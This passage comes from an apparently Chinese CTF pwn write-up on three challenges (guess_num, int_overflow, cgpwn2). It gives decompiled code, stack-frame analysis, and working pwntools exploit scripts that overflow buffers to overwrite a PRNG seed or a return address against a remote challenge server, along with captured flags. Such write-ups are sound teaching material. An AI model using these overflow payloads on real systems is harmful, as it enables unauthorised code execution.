<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();					<span class="comment">//生成随机数种子</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  gets(v7);										<span class="comment">//v7缓冲区长32字节,这里可以溢出</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )					<span class="comment">//猜数游戏一共需要 玩九次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;						<span class="comment">//v6∈[1,6]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);					<span class="comment">//无法溢出</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )								<span class="comment">//每次成功都需要v4=v6</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();								<span class="comment">//cat flag</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-000000000000003C var_3C          dd ?					;v4</span><br><span class="line">-0000000000000038 var_38          dd ?					;i</span><br><span class="line">-0000000000000034 var_34          dd ?					;v6</span><br><span class="line">-0000000000000030 var_30          db 32 dup(?)			;v7缓冲区</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line">-0000000000000008 var_8           dq ?					;v9</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>从栈帧布局上看,v7溢出无法修改v6,i,v4,只能溢出高地址的seed,var_8,s,r</p>
<p>这里只需要溢出到seed,把它改成0</p>
<p>当随机数种子为0时,其生成的伪随机数序列是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> seed = <span class="number">0</span>;</span><br><span class="line">	srand(seed);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在windows上的运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3  4  5  2  6  2  2  6  5  1</span><br></pre></td></tr></table></figure>
<p>在linux上的运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2  5  4  2  6  2  5  1  4  2 </span><br></pre></td></tr></table></figure>
<p><code>[ebp-30h,ebp-10h)</code>随便写,<code>[ebp-10h,ebp-8h)</code>溢出成0</p>
<h3 id="exp-2">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./guess_num&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;61574&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your name:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Success!</span><br><span class="line">You are a prophet!</span><br><span class="line">Here is your flag!cyberpeace&#123;60097ace8e8ecc14e7efb47bab0d5ef1&#125;</span><br></pre></td></tr></table></figure>
<h2
id="int_overflow栈缓冲区溢出改变栈中整数">004int_overflow(栈缓冲区溢出改变栈中整数)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\int_overflow&gt; checksec int_overflow</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\int_overflow\\int_overflow&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>直接看String视图,发现有一个</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220519232804685.png"
alt="image-20220519232804685" />
<figcaption aria-hidden="true">image-20220519232804685</figcaption>
</figure>
<p><code>.rodata:08048960 command         db 'cat flag',0         ; DATA XREF: what_is_this+9↑o</code></p>
<p>交叉引用上表明这个字符串出现在<code>what_is_this</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">what_is_this</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而Function
calls视图上没有任何函数调用该函数,看来需要栈溢出修改函数返回地址调用了</p>
<h3 id="login">login()</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>]; <span class="comment">// [esp+0h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+200h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x19</span>u);<span class="comment">//s缓冲区大小40字节,这里限制最大读入0x19&lt;40,不会溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x199</span>u);<span class="comment">//buf大小为512字节,这里限定读入不超过0x199&lt;512,不会溢出</span></span><br><span class="line">  <span class="keyword">return</span> check_passwd(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="check_passwdbuf">check_passwd(buf)</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">check_passwd</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">11</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]		//注意v3长度为8位,一个字节,能表示[0,255]范围的非负整数</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);							<span class="comment">//strlen返回值可以长于8位,因此会发生溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )			<span class="comment">//要求v3长度在[4,8]之间</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="type">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//需要通过溢出使得前面对v3的限制通过,然后将what_is_this的地址溢出到返回地址</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(dest, s);<span class="comment">//将s拷贝到dest,s最长0x199字节,而dest最长11字节,显然可以溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014 dest            db 11 dup(?)</span><br><span class="line">-00000009 var_9           db ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 s               dd ?                    ; offset</span><br><span class="line">+0000000C</span><br><span class="line">+0000000C ; end of stack variables</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
dest\in [ebp-14h,ebp-9h)
\]</span></p>
<p>溢出时<code>[ebp-0x14h,ebp+0x3h]</code>共24字节用任意字符填空</p>
<p><code>[ebp+4,ebp+7]</code>填上返回值地址<code>0x804868B</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;A&#x27;*24+p32(0x804868B).decode(&#x27;unicode_escape&#x27;)</span><br></pre></td></tr></table></figure>
<p>还要考虑如何通过<code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code></p>
<p><code>unsigned char a=256</code>则实际上<code>a=0</code></p>
<p><code>unsigned char a=260</code>则实际上<code>a=4</code></p>
<p><code>unsigned char a=264</code>则实际上<code>a=8</code></p>
<blockquote>
<p>对256取模</p>
</blockquote>
<p>那么<code>v3 = strlen(s);</code>这里s的长度应该在260到264之间</p>
<p>刚才payload中已经构造出了20个字符,还需要再填充240个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;A&#x27;*24+p32(0x804868B).decode(&#x27;unicode_escape&#x27;)+&#x27;A&#x27;*232</span><br></pre></td></tr></table></figure>
<h3 id="exp-3">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./int_overflow&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;60842&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please input your username:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please input your passwd:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">24</span>+p32(<span class="number">0x804868B</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+<span class="string">&#x27;A&#x27;</span>*<span class="number">232</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Success</span><br><span class="line">cyberpeace&#123;d28ca52ce20608a03519e5fcbd79b1b5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cgpwn2ret2text">005cgpwn2(ret2text)</h2>
<h3 id="反汇编分析">反汇编分析</h3>
<h4 id="main-hello">main()-&gt;hello()</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">hello</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...<span class="comment">//前面运算了一堆,没有用</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);		<span class="comment">//输入姓名,无用之用,方为大用</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,you can leave some message here:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets((<span class="type">char</span> *)&amp;s);<span class="comment">//gets(s)可以实现栈缓冲区溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pwn">pwn()</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo hehehe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这有一个没有被调用过的函数,pwn(),它使用了system调用shell.</p>
<p>然而它打印的这句话"echo hehehe"是在rodata只读区的,没法溢出修改.</p>
<p>但是pwn不是一无是处,起码有一个可以调用system的地址<code>0x08048420</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804855A                 call    _system</span><br><span class="line"></span><br><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br><span class="line">.plt:08048420</span><br></pre></td></tr></table></figure>
<p>如果可以修改hello的返回值为<code>0x0804855A</code>,并将期望的命令比如<code>/bin/sh</code>放在栈顶,如此也可以获得shell</p>
<p>下面考虑如何利用<code>return gets((char *)&amp;s);</code>实现栈缓冲区溢出</p>
<h3 id="考虑栈缓冲区溢出">考虑栈缓冲区溢出</h3>
<p>hello函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-00000038                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line">...</span><br><span class="line">-00000026 s               dw ?</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">-00000022                 db ? ; undefined</span><br><span class="line">-00000021                 db ? ; undefined</span><br><span class="line">-00000020                 db ? ; undefined</span><br><span class="line">-0000001F                 db ? ; undefined</span><br><span class="line">-0000001E                 db ? ; undefined</span><br><span class="line">-0000001D                 db ? ; undefined</span><br><span class="line">-0000001C                 db ? ; undefined</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C                 db ? ; undefined</span><br><span class="line">-0000000B                 db ? ; undefined</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line"></span><br><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="开端和尾声-每条指令执行后的栈帧情况分析">开端和尾声
每条指令执行后的栈帧情况分析</h4>
<h5 id="开端">开端:</h5>
<h6
id="text0804864c-call-hello">1.<code>.text:0804864C                 call    hello        ;</code></h6>
<p>call之后hello的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里有一个问题,32位系统上返回值可以用4字节一个int表示,为什么这条call指令要压8字节的栈?</p>
<p>并且将返回值放在低4字节,高四字节全放0?</p>
<p>写了好多程序编译成32位的然后用ida观察都是如此,高四字节都是0.</p>
<p>搜了半天也没找到一个靠谱的答案,pending...</p>
</blockquote>
<h6
id="text08048562-push-ebp-ebp压栈占用4字节">2.<code>.text:08048562                 push    ebp          ;ebp压栈,占用4字节</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048565-push-esi-esi压栈被调用者保存寄存器">3.<code>.text:08048565                 push    esi          ;esi压栈,被调用者保存寄存器</code></h6>
